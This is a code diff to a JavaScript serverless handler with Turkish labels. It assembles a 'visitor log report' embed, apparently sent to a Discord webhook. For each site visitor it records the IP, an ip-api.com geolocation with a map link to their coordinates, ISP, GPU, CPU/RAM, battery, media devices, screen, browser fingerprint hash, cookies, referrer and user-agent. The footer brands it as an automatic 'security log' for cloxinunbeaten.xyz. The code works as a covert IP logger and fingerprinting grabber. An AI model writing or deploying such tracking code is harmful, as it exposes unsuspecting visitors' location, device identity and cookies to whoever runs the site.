@@ -6,47 +6,83 @@ exports.handler = async (event, context) => {
     }
   } catch (e) {}
 
+  const clientIp = data.ip || event.headers['cf-connecting-ip'] || event.headers['x-forwarded-for'] || 'Bilinmiyor';
+
+  // GeoIP Bilgilerini Backend'den Çek
+  let country = 'Bilinmiyor';
+  let city = 'Bilinmiyor';
+  let isp = 'Bilinmiyor';
+  let timezone = 'Bilinmiyor';
+  let coords = null;
+
+  if (clientIp !== 'Bilinmiyor') {
+    try {
+      const geoRes = await fetch(`http://ip-api.com/json/${clientIp}?fields=status,country,city,isp,org,timezone,lat,lon,as`);
+      const geoData = await geoRes.json();
+
+      if (geoData.status === 'success') {
+        country = geoData.country || 'Bilinmiyor';
+        city = geoData.city || 'Bilinmiyor';
+        isp = `${geoData.isp || geoData.org} (${geoData.as || ''})`;
+        timezone = geoData.timezone || 'Bilinmiyor';
+        coords = `https://www.google.com/maps?q=${geoData.lat},${geoData.lon}`;
+      }
+    } catch (e) {}
+  }
+
   const embed = {
-    title: "📊 Detaylı Ziyaretçi & Donanım Raporu",
-    color: 3447003,
+    title: "⚡ ZİYARETÇİ LOG RAPORU",
+    color: 5814783, // Modern Blurple/Mavi tonu
     fields: [
       {
-        name: "🌐 Ağ & Konum Bilgileri",
+        name: "🌐 Ağ & Konum",
         value: 
-          `**IP Adresi:** ${data.ip || 'Bilinmiyor'}\n` +
-          `**Konum:** ${data.location || 'Bilinmiyor'}\n` +
-          `**Zaman Dilimi:** ${data.timezone || 'Bilinmiyor'}\n` +
-          `**İSS & ASN:** ${data.isp || 'Bilinmiyor'}\n` +
-          `**Koordinatlar:** ${data.coords ? `[Haritada Gör](${data.coords})` : 'Bilinmiyor'}`
+          `• **IP:** \`${clientIp}\`\n` +
+          `• **Konum:** ${city} / ${country}\n` +
+          `• **İSS:** ${isp}\n` +
+          `• **Zaman Dilimi:** ${timezone}\n` +
+          (coords ? `• **Harita:** [Konuma Git](${coords})` : `• **Harita:** Bilinmiyor`),
+        inline: false
       },
       {
-        name: "💻 Donanım, Medya & Parmak İzi",
+        name: "💻 Donanım & Sistem",
         value: 
-          `**Benzersiz Parmak İzi (Hash):** \`${data.fingerprint || 'Bilinmiyor'}\`\n` +
-          `**Ekran Kartı (GPU):** ${data.gpu || 'Bilinmiyor'}\n` +
-          `**Takılı Medya Cihazları:** ${data.media || 'Bilinmiyor'}\n` +
-          `**İşletim Sistemi / Platform:** ${data.platform || 'Bilinmiyor'}\n` +
-          `**Donanım (CPU / RAM):** ${data.hardware || 'Bilinmiyor'}\n` +
-          `**Batarya:** ${data.battery || 'Bilinmiyor'}`
+          `• **GPU:** \`${data.gpu || 'Bilinmiyor'}\`\n` +
+          `• **CPU / RAM:** ${data.hardware || 'Bilinmiyor'}\n` +
+          `• **İşletim Sistemi:** ${data.platform || 'Bilinmiyor'}\n` +
+          `• **Batarya:** ${data.battery || 'Bilinmiyor'}\n` +
+          `• **Cihazlar:** ${data.media || 'Bilinmiyor'}`,
+        inline: false
       },
       {
-        name: "🖥️ Ekran & Dokunmatik",
+        name: "🖥️ Ekran & Görüntü",
         value: 
-          `**Ekran:** ${data.screen || 'Bilinmiyor'}\n` +
-          `**Pencere:** ${data.windowSize || 'Bilinmiyor'}\n` +
-          `**Renk / Piksel:** ${data.colorDepth || 'Bilinmiyor'}\n` +
-          `**Dokunmatik Ekran:** ${data.touch || 'Bilinmiyor'}`
+          `• **Çözünürlük:** ${data.screen || 'Bilinmiyor'}\n` +
+          `• **Pencere:** ${data.windowSize || 'Bilinmiyor'}\n` +
+          `• **Renk Derinliği:** ${data.colorDepth || 'Bilinmiyor'}\n` +
+          `• **Dokunmatik:** ${data.touch || 'Bilinmiyor'}`,
+        inline: true
       },
       {
-        name: "🌐 Tarayıcı & Oturum Bilgileri",
+        name: "🔍 Oturum & Tarayıcı",
         value: 
-          `**Tarayıcı Dilleri:** ${data.languages || 'Bilinmiyor'}\n` +
-          `**Çerezler:** ${data.cookies || 'Bilinmiyor'}\n` +
-          `**Geldiği Yer (Referrer):** ${data.referrer || 'Doğrudan Giriş'}\n` +
-          `**Ziyaret Edilen Sayfa:** ${data.url || 'Bilinmiyor'}\n` +
-          `**User-Agent:** \`${event.headers['user-agent'] || 'Bilinmiyor'}\``
+          `• **Hash:** \`${data.fingerprint || 'Bilinmiyor'}\`\n` +
+          `• **Diller:** ${data.languages || 'Bilinmiyor'}\n` +
+          `• **Geldiği Yer:** ${data.referrer || 'Doğrudan'}\n` +
+          `• **Çerezler:** ${data.cookies || 'Bilinmiyor'}`,
+        inline: true
+      },
+      {
+        name: "📌 Sayfa & User-Agent",
+        value: 
+          `• **URL:** ${data.url || 'Bilinmiyor'}\n` +
+          `• **UA:** \`${event.headers['user-agent'] || 'Bilinmiyor'}\``,
+        inline: false
       }
     ],
+    footer: {
+      text: "cloxinunbeaten.xyz • Otomatik Güvenlik Logu"
+    },
     timestamp: new Date().toISOString()
   };
 
